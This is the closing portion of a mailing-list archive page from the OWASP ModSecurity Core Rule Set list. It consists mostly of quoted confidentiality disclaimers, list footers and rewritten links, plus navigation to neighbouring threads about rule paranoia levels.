</I>&gt;<i> &gt;&gt; &gt;&gt;herein (including any reliance thereon) is strictly prohibited. If you
</I>&gt;<i> &gt;&gt; &gt;&gt;received this transmission in error, please immediately contact the
</I>&gt;<i> &gt;&gt; &gt;&gt;sender and destroy the material in its entirety, whether in electronic
</I>&gt;<i> &gt;&gt; &gt;&gt;or hard copy format.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; _______________________________________________
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; Owasp-modsecurity-core-rule-set mailing list
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;<A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX">http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX</A>
</I>&gt;<i> &gt;&gt;&gt;&gt;mK
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;ENdLz6Plw&amp;s=5&amp;u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
</I>&gt;<i> &gt;&gt;&gt;&gt;2f
</I>&gt;<i> &gt;&gt; &gt;&gt;owasp-modsecurity-core-rule-set
</I>&gt;<i> &gt;&gt; &gt;&gt; _______________________________________________
</I>&gt;<i> &gt;&gt; &gt;&gt; Owasp-modsecurity-core-rule-set mailing list
</I>&gt;<i> &gt;&gt; &gt;&gt; <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;<A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX">http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX</A>
</I>&gt;<i> &gt;&gt;&gt;&gt;mK
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;ENdLz6Plw&amp;s=5&amp;u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
</I>&gt;<i> &gt;&gt;&gt;&gt;2f
</I>&gt;<i> &gt;&gt; &gt;&gt;owasp-modsecurity-core-rule-set
</I>&gt;<i> &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;--
</I>&gt;<i> &gt;&gt; &gt;mailto:<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;<A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm">http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm</A>
</I>&gt;<i> &gt;&gt;&gt;KE
</I>&gt;<i> &gt;&gt; &gt;YIczjUmg&amp;s=5&amp;u=http%3a%2f%2fwww%2echristian-folini%2ech
</I>&gt;<i> &gt;&gt; &gt;twitter: @ChrFolini
</I>&gt;<i> &gt;&gt; &gt;_______________________________________________
</I>&gt;<i> &gt;&gt; &gt;Owasp-modsecurity-core-rule-set mailing list
</I>&gt;<i> &gt;&gt; &gt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;<A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm">http://scanmail.trustwave.com/?c=4062&amp;d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm</A>
</I>&gt;<i> &gt;&gt;&gt;KE
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;NdLz6Plw&amp;s=5&amp;u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
</I>&gt;<i> &gt;&gt;&gt;ow
</I>&gt;<i> &gt;&gt; &gt;asp-modsecurity-core-rule-set
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt; ________________________________
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt; This transmission may contain information that is privileged,
</I>&gt;<i> &gt;&gt;confidential, and/or exempt from disclosure under applicable law. If you
</I>&gt;<i> &gt;&gt;are not the intended recipient, you are hereby notified that any
</I>&gt;<i> &gt;&gt;disclosure, copying, distribution, or use of the information contained
</I>&gt;<i> &gt;&gt;herein (including any reliance thereon) is strictly prohibited. If you
</I>&gt;<i> &gt;&gt;received this transmission in error, please immediately contact the
</I>&gt;<i> &gt;&gt;sender and destroy the material in its entirety, whether in electronic
</I>&gt;<i> &gt;&gt;or hard copy format.
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> ________________________________
</I>&gt;<i> 
</I>&gt;<i> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
</I></PRE>

<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001999.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
	<LI>Next message: <A HREF="001887.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#2001">[ date ]</a>
              <a href="thread.html#2001">[ thread ]</a>
              <a href="subject.html#2001">[ subject ]</a>
              <a href="author.html#2001">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
